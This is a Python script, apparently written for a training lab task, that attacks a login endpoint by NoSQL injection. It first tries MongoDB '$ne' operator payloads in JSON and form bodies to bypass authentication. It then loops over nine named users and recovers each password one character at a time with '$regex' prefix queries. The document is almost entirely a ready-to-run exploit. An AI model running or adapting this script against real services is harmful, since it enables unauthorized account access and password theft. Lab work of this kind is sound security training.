#!/usr/bin/env python3
"""
NoSQL Password Enumerator - Task 7
Target: http://web0x01.hbtn/a3/nosql_injection
"""

import requests
import string
import sys

URL = "http://web0x01.hbtn/a3/nosql_injection"

USERS = ["abdou", "dexter", "elon-musk", "foued", "hugo", 
         "ismail", "jeremy", "maroua", "yosri"]

# Printable chars excluding regex special chars
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-@."

def check_format():
    """Test which request format works."""
    print("[*] Testing request formats...")
    
    # Test 1: JSON format
    r1 = requests.post(URL, json={"username": "admin", "password": {"$ne": ""}}, 
                       allow_redirects=False, timeout=10)
    print(f"  JSON $ne: status={r1.status_code}, len={len(r1.text)}")
    
    # Test 2: URL-encoded format  
    r2 = requests.post(URL, data={"username": "admin", "password[$ne]": ""},
                       allow_redirects=False, timeout=10)
    print(f"  Form $ne: status={r2.status_code}, len={len(r2.text)}")
    
    # Test 3: Login with wrong creds (baseline)
    r3 = requests.post(URL, data={"username": "admin", "password": "wrong"},
                       allow_redirects=False, timeout=10)
    print(f"  Wrong creds: status={r3.status_code}, len={len(r3.text)}")
    
    return r1, r2, r3

def enumerate_password(username, use_json=False):
    """Enumerate password char by char using $regex."""
    password = ""
    print(f"\n[*] Enumerating password for: {username}")
    
    while True:
        found = False
        for c in CHARSET:
            regex = f"^{password}{c}.*"
            
            if use_json:
                payload = {"username": username, "password": {"$regex": regex}}
                r = requests.post(URL, json=payload, allow_redirects=False, timeout=10)
            else:
                payload = {"username": username, "password[$regex]": regex}
                r = requests.post(URL, data=payload, allow_redirects=False, timeout=10)
            
            # Check for success - adjust based on actual response
            success = False
            if r.status_code == 302:
                success = True
            elif "flag" in r.text.lower() or "welcome" in r.text.lower() or "dashboard" in r.text.lower():
                success = True
            elif "invalid" not in r.text.lower() and "error" not in r.text.lower():
                # Blind check - compare with baseline
                pass
            
            if success:
                password += c
                print(f"[+] Found: {password}")
                found = True
                break
        
        if not found:
            # Verify if complete
            if use_json:
                r = requests.post(URL, json={"username": username, "password": {"$regex": f"^{password}$"}},
                                  allow_redirects=False, timeout=10)
            else:
                r = requests.post(URL, data={"username": username, "password[$regex]": f"^{password}$"},
                                  allow_redirects=False, timeout=10)
            
            if r.status_code == 302 or "welcome" in r.text.lower():
                print(f"[✓] FULL PASSWORD: {password}")
            else:
                print(f"[-] Partial (or complete): {password}")
            break
    
    return password

if __name__ == "__main__":
    check_format()
    
    for user in USERS:
        input(f"\n[?] Press Enter to enumerate {user}...")
        enumerate_password(user)
